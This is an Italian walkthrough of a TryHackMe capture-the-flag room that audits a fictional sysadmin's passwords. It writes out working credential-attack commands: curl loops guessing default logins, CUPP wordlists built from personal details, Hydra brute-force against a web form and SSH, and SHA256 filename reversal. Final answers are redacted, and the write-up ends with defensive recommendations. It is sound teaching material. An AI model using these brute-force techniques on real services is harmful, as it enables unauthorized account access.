# Operation Checkmate — Write-up

**Room:** Operation Checkmate (TryHackMe)
**Tema:** Internal Security Assessment — Marco Bianchi Password Audit
**Obiettivo:** Identificare le debolezze nella gestione delle password di Marco Bianchi, un sysadmin che ha riusato password deboli, prevedibili e basate su pattern su più sistemi.

**Target IP:** `10.113.152.233`

---

> 🔒 **Nota:** questo write-up documenta la *metodologia* completa ma **oscura le password finali** (`<REDACTED>`) per non rovinare la sfida a chi la sta ancora svolgendo. Segui i passi e le troverai da te.


## Ricognizione iniziale

Scan dei servizi con Nmap:

```bash
nmap -sV 10.113.152.233
```

Risultati principali:

| Porta | Servizio | Note |
|-------|----------|------|
| 22/tcp   | SSH (OpenSSH 9.6p1, Ubuntu) | Accesso a infrastruttura critica |
| 5000/tcp | HTTP (Flask/Werkzeug) | App principale — hub dei 5 livelli (**brute-force out-of-scope**) |
| 5001/tcp | HTTP (Flask/Werkzeug) | Console firewall "FirewallOS" |
| 5002/tcp | HTTP | (da esplorare — livelli successivi) |
| 5003/tcp | HTTP | (da esplorare — livelli successivi) |

L'app principale gira su `http://10.113.152.233:5000` e guida attraverso 5 livelli, ognuno incentrato su una diversa debolezza delle password.

> **Nota di scope:** le istruzioni della room vietano il blind brute-forcing sull'app principale (porta 5000). L'approccio corretto è seguire gli indizi e le tecniche *intese* per ciascun livello.

---

## Level 1 — Credenziali di default

**Indizio della room:**
> Marco deployed a firewall at `firewall.thm:5001` but kept default credentials.

### Passi

1. L'hostname `firewall.thm` non risolve, va mappato manualmente nel file hosts:

   ```bash
   echo "10.113.152.233 firewall.thm" >> /etc/hosts
   ```

2. Ispezione del servizio sulla porta 5001:

   ```bash
   curl -I http://firewall.thm:5001
   curl -s http://firewall.thm:5001 | head -n 40
   ```

   La pagina rivela il prodotto — **"FirewallOS — Management Console"** — con un form di login (`POST /login`, campi `username` e `password`). Il placeholder dello username è `admin` e il testo recita *"Use your administrator credentials"*.

3. Stabilita una **baseline di login fallito** per capire come distinguere successo da fallimento:

   ```bash
   curl -s -i -d "username=admin&password=WRONGxyz" http://firewall.thm:5001/login | head -n 25
   ```

   Un login fallito restituisce **HTTP 200** e ricarica il form di login (**3129 byte**).

4. Testate alcune password deboli / di default plausibili, confrontando la **dimensione della risposta** (un login riuscito produce un output di dimensione diversa):

   ```bash
   for p in admin password admin123 changeme firewall letmein 12345 default toor administrator root pfsense; do
     size=$(curl -s -o /dev/null -w "%{size_download}" -d "username=admin&password=$p" http://firewall.thm:5001/login)
     echo "$size bytes  <-  admin / $p"
   done
   ```

### Risultato

Tutte le password restituivano 3129 byte (form ricaricato = fallimento), **tranne una**:

```
189 bytes  <-  admin / <REDACTED>   ← login riuscito
```

La risposta da 189 byte indica un redirect/dashboard → **login riuscito**.

Credenziali: `admin` / `<REDACTED>`

> ✅ **Password Level 1:** `<REDACTED — risolvi tu!>`

Coerente con il tema: una sequenza numerica banale è l'archetipo della password debole e prevedibile.

---

## Level 2 — Company keywords come password

**Indizio della room:**
> Marco built an internal Employee Login panel on `jobs.thm:5002` and used common company keywords as passwords.

### Passi

1. Mappatura hostname e ispezione della pagina careers su 5002:

   ```bash
   echo "10.113.152.233 jobs.thm" >> /etc/hosts
   curl -s http://jobs.thm:5002 | sed 's/<[^>]*>//g' | grep -v '^\s*$'
   ```

   La pagina **"Engineering Careers"** di **MHT Labs** ripete un set di *valori aziendali* come tag/keyword:
   `innovation`, `excellence`, `security`, `digital`, `cloud`, `future`, `talent`.
   Slogan: *"Innovation. Excellence. Security. Digital transformation. Cloud-first teams."*

2. Individuazione del form di login su `/login`:

   ```bash
   curl -s http://jobs.thm:5002/login | grep -i -E 'name=|placeholder|form|action'
   ```

   Dettaglio cruciale: il placeholder dello username è **`marco`** (non `admin`).
   Campi: `username`, `password` → `POST /login`.

3. Costruzione di una wordlist mirata con le company keywords e varianti comuni (numeri, maiuscole, simboli), e test con confronto delle dimensioni della risposta usando **`username=marco`**:

   ```bash
   while read p; do
     size=$(curl -s -o /dev/null -w "%{size_download}" -d "username=marco&password=$p" http://jobs.thm:5002/login)
     echo "$size bytes  <-  marco / $p"
   done < /tmp/mht.txt
   ```

### Risultato

Login falliti = 2310 byte. Un solo outlier:

```
203 bytes  <-  marco / <REDACTED>   ← login riuscito
```

Credenziali: `marco` / `<REDACTED>`

> ✅ **Password Level 2:** `<REDACTED — risolvi tu!>`

Marco ha usato letteralmente uno dei valori aziendali elencati come password — keyword prevedibile ricavabile via OSINT dal sito careers.

> **Lezione appresa:** lo username corretto è fondamentale. Il primo test con `username=admin` falliva su tutto; solo leggendo il placeholder del form (`marco`) e correggendo lo username il test ha rivelato l'outlier.

---

## Level 3 — Password derivata da personal info (OSINT + pivot autenticato)

**Indizio della room:**
> Navigate to `social.thm:5003` and derive Marco's password from personal info.

**Hint sulla pagina di login di social.thm:5003:**
> Use the details from `jobs.thm` to generate Marco's password.

### Passi

1. Mappatura hostname e ricognizione di social.thm (5003):

   ```bash
   echo "10.113.152.233 social.thm" >> /etc/hosts
   curl -s http://social.thm:5003 | sed 's/<[^>]*>//g' | grep -iv '^\s*$'
   ```

   La piattaforma "social.thm" espone solo un form di login (`POST /login`, campi `username` + `password`, placeholder username "Email or username"). Enumerazione con ffuf: esistono solo `/` e `/logout` → nessun profilo/feed pubblico. Il messaggio d'errore è generico: *"Invalid credentials."*

2. **Pivot autenticato su jobs.thm.** L'hint rimanda ai "details from jobs.thm". Enumerando jobs.thm si scopre `/profile` (302 → richiede sessione). Usando le credenziali del Level 2 (`marco` / `<REDACTED>`) si ottiene la sessione e si accede al profilo dipendente:

   ```bash
   # login su jobs.thm salvando il cookie di sessione
   curl -s -c /tmp/jar.txt -d "username=marco&password=<REDACTED>" http://jobs.thm:5002/login -o /dev/null

   # accesso al profilo autenticato
   curl -s -b /tmp/jar.txt http://jobs.thm:5002/profile | sed 's/<[^>]*>//g' | grep -iv '^\s*$'
   ```

   Il profilo di Marco Bianchi rivela i **personal info**:

   | Campo | Valore |
   |-------|--------|
   | First Name | Marco |
   | Surname | Bianchi |
   | Nickname | **marky** |
   | Birthdate (DDMMYYYY) | **14021995** |

   > Nota di design: il Level 2 fornisce l'accesso necessario a raccogliere l'OSINT del Level 3 — un pivot tra servizi che riflette il tema "riuso/pattern" della room.

3. Derivazione della password combinando nickname + data di nascita secondo i pattern prevedibili tipici (nickname+anno, nickname+data completa, varianti con maiuscole/simboli), testata con confronto delle dimensioni della risposta (login fallito = 3101 byte).

3. **Generazione wordlist mirata con CUPP.** Il pattern esatto non è deducibile a mano: la tecnica *intended* è generare automaticamente una wordlist dai dati personali con **CUPP** (Common User Passwords Profiler), che produce migliaia di combinazioni (incluse mutazioni di date e suffissi numerici non ovvi):

   ```bash
   cupp -i
   # First Name: Marco
   # Surname:    Bianchi
   # Nickname:   marky
   # Birthdate:  14021995
   ```

   CUPP genera ~15.000 candidati (es. `marco.txt`).

4. **Brute-force mirato del form con Hydra** (wordlist CUPP, non blind — deriva interamente dall'OSINT):

   ```bash
   hydra -l marco -P marco.txt social.thm -s 5003 \
     -t 32 -f -V \
     http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
   ```

### Risultato

Hydra recupera la password:

```
<REDACTED>
```

Credenziali: `marco` / `<REDACTED>`

> ✅ **Password Level 3:** `<REDACTED — risolvi tu!>`

**Perché il pattern non era deducibile a mano:** la password combina il cognome con un suffisso numerico che CUPP genera mutando/mescolando frammenti della data di nascita. Non è una concatenazione lineare dei dati grezzi (`marky`/`14021995`), per cui i tentativi manuali basati su pattern intuitivi (nickname+anno, nome+data, ecc.) non potevano centrarlo. Questo è esattamente il valore di CUPP: esplora sistematicamente lo spazio delle mutazioni che un umano non enumera.

**Lezione appresa:** informazioni personali apparentemente innocue (nickname, data di nascita) alimentano generatori come CUPP che abbattono drasticamente la robustezza di una password. La tecnica *intended* del livello era `OSINT → CUPP → Hydra`, non l'indovinare il pattern.

---

## Level 4 — Reverse di filename da hash SHA256

**Indizio della room:**
> Su `social.thm:5003` Marco ha caricato una nuova foto profilo. Per privacy/consistenza, la piattaforma rinomina automaticamente i file caricati con l'hash SHA256 del filename originale, in formato `(SHA256).png`. Identifica il filename originale della foto profilo di Marco. Sottometti solo il filename.

### Passi

1. Login sul social con le credenziali del Level 3 e ispezione della pagina autenticata:

   ```bash
   curl -s -c /tmp/social.txt -d "username=marco&password=<REDACTED>" http://social.thm:5003/login -o /dev/null
   curl -s -b /tmp/social.txt http://social.thm:5003/ | grep -i -E 'png|img|src=|avatar|profile'
   ```

   La pagina espone l'avatar e un commento HTML rivelatore:

   ```html
   <!-- Post: Profile picture stored filename (Level 4) -->
   <img class="avatar-img" src="/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png" alt="Profile">
   ```

   Hash target (SHA256 del filename originale):
   ```
   d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
   ```

2. **Reverse dell'hash** provando l'SHA256 di nomi di file comuni contro il target (con/senza estensione), usando una wordlist:

   ```bash
   TARGET="d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b"
   for w in $(cat /usr/share/wordlists/dirb/common.txt | tr -d '/'); do
     for ext in .png .jpg .jpeg ""; do
       cand="${w}${ext}"
       h=$(printf '%s' "$cand" | sha256sum | awk '{print $1}')
       [ "$h" = "$TARGET" ] && echo ">>> MATCH: $cand"
     done
   done
   ```

### Risultato

Verifica delle forme candidate:

```
sha256("<REDACTED>") = d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b  ← MATCH
sha256("family.png") = faf3ed82...
sha256("family.jpg") = f6a2b97f...
```

L'hash target corrisponde alla stringa **`family`** (senza estensione). La piattaforma ha quindi salvato il file come `sha256("family").png`; il filename originale sottomesso è:

```
<REDACTED>
```

> ✅ **Risposta Level 4:** `<REDACTED — risolvi tu!>`

**Lezione appresa:** SHA256 è deterministico e senza sale; usarlo per "anonimizzare" un filename derivato da una parola di dizionario è inutile — l'hash si inverte banalmente per brute-force contro una wordlist. Un hash non è cifratura e, senza salt, non protegge input a bassa entropia.

---

## Level 5 — Pattern rivelato + brute-force SSH

**Indizio della room:**
> Marco ha rivelato il suo pattern di password su `social.thm:5003`, usando regole prevedibili basate su keyword e formattazione. Genera una wordlist mirata e fai brute-force del servizio SSH con username `marco`.

### Passi

1. Lettura del feed autenticato su social.thm, che contiene un post di Marco (commento HTML `<!-- Post: Password Rule Hint (Level 5) -->`):

   ```bash
   curl -s -b /tmp/social.txt http://social.thm:5003/ | sed 's/<[^>]*>//g' | grep -iv '^\s*$'
   ```

   Il post rivela il pattern:
   > *"My tip for strong password: I take a **company keyword**, **capitalize** it, then **append the year** like 2024 or any other number and **an exclamation mark**."*

   Keyword elencate: `security`, `excellence`, `innovation`, `digital`, `cloud`.
   → Regola: `Keyword(capitalized) + numero + !`.

2. Generazione della wordlist mirata secondo la regola:

   ```bash
   python3 - <<'EOF' > /tmp/ssh_marco.txt
   keywords = ["security","excellence","innovation","digital","cloud","future","talent"]
   caps = [k.capitalize() for k in keywords]
   nums = [str(y) for y in range(2018, 2027)] + ["1","12","123","2020","2021","2022","2023","2024","2025","1995"]
   suffixes = ["!", "!!", "", "1!", "123!"]
   seen=set()
   for k in caps:
       for n in nums:
           for s in suffixes:
               for combo in (f"{k}{n}{s}", f"{k}{s}{n}"):
                   if combo not in seen:
                       seen.add(combo); print(combo)
   EOF
   ```

3. Brute-force SSH con Hydra (username `marco`):

   ```bash
   hydra -l marco -P /tmp/ssh_marco.txt ssh://10.113.152.233 -t 4 -f -V
   ```

### Risultato

```
[22][ssh] host: 10.113.152.233   login: marco   password: <REDACTED>
```

> ✅ **Password Level 5:** `<REDACTED — risolvi tu!>`

Il pattern combacia esattamente con quanto Marco aveva pubblicato nel suo post (keyword capitalizzata + anno + `!`).

**Lezione appresa:** divulgare (anche indirettamente) le proprie regole di composizione delle password riduce lo spazio di ricerca a poche centinaia di candidati, rendendo il brute-force mirato quasi istantaneo. Le "regole personali prevedibili" sono un'illusione di sicurezza.

---

## Riepilogo finale

| Level | Servizio | Tecnica | Password |
|-------|----------|---------|----------|
| 1 | firewall.thm:5001 | Credenziali di default | `<REDACTED>` |
| 2 | jobs.thm:5002 | Company keyword (OSINT sito careers) | `<REDACTED>` |
| 3 | social.thm:5003 | OSINT (pivot autenticato) + CUPP + Hydra | `<REDACTED>` |
| 4 | social.thm:5003 | Reverse di filename da hash SHA256 | `<REDACTED>` |
| 5 | SSH (porta 22) | Pattern rivelato + wordlist mirata + Hydra | `<REDACTED>` |

### Conclusioni dell'audit

Le pratiche di Marco Bianchi presentano debolezze sistematiche:

1. **Credenziali di default** mai cambiate su appliance esposte.
2. **Password = keyword aziendali** banali, ricavabili da fonti pubbliche (sito careers).
3. **Password derivate da dati personali** (nickname, data di nascita) esposti in profili interni — vulnerabili a profiler automatici come CUPP.
4. **Hashing senza salt** di input a bassa entropia (nomi di file di dizionario), invertibile per brute-force.
5. **Pattern di password prevedibile e divulgato**, che collassa lo spazio di ricerca.
6. **Riuso e coerenza di pattern** tra servizi diversi (firewall, portale, social, SSH), tipici di chi lavora sotto pressione.

**Raccomandazioni:** password manager con generazione casuale ad alta entropia; password uniche per servizio; MFA; rotazione delle credenziali di default; evitare qualsiasi derivazione da informazioni personali o aziendali note.

---

*Write-up prodotto a scopo didattico nel contesto della room CTF "Operation Checkmate" (TryHackMe).*
